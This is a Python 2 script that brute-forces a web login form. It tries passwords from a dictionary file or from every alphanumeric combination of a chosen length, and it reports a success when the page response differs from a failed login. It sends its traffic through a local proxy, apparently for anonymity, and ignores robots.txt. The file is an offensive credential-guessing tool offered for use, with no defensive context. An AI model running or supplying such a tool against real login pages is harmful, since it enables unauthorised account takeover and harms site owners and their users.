import argparse
import mechanize
from itertools import product
from string import ascii_letters, digits

parser = argparse.ArgumentParser()
parser.add_argument("--dictionary", help="Password dictionary")
parser.add_argument("--url", help="Login form URL")
parser.add_argument("--input", help="Form's input name")
parser.add_argument("--bruteforce", help="No. of characters", default=4)

args = parser.parse_args()

if args.dictionary:
    print "[*] Using dictionary: " + args.dictionary
else:
    print "[*] Using bruteforce with %s char length " % args.bruteforce

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_proxies({
    "http":"127.0.0.1:8118",
})
print "[*] URL: " + args.url
br.open(args.url)
br.select_form(nr=0)
print "[*] Getting an invalid response..."
response = br.submit()
invalid_response = response.read()

print "[*] Invalid response: "
print invalid_response
print "[*] ----------------------------------"

# Using dictionary
if args.dictionary:
    with open(args.dictionary, 'r') as passwords:
        for password in passwords:
            try:
                br.select_form(nr=0)
                br.form[args.input] = password
                print '[*] Trying password "' + password.strip() + '"'
                response = br.submit()
                content = response.read()
                # print '[*] Response length "' + str(len(content))
                if invalid_response != content:
                    print '\n\033[34m[+] Success for password: ' + password.strip() + '\033[0m'
                    print '[*] Content: \n' + response.read()
                    break
            except:
                pass
# Using bruteforce
else:
    print "[*] Generating all %s letters passwords..." % args.bruteforce
    passwords = [''.join(i) for i in product(ascii_letters+digits, repeat=int(args.bruteforce))]
    print "[*] %s passwords have been created " % len(passwords)
    for password in passwords:
        br.select_form(nr=0)
        br.form[args.input] = password
        print '[*] Trying password "' + password.strip() + '"'
        response = br.submit()
        content = response.read()
        # print '[*] Response length "' + str(len(content))
        if invalid_response != content:
            print '\n\033[34m[+] Success for password: ' + password.strip() + '\033[0m'
            print '[*] Content: \n' + response.read()
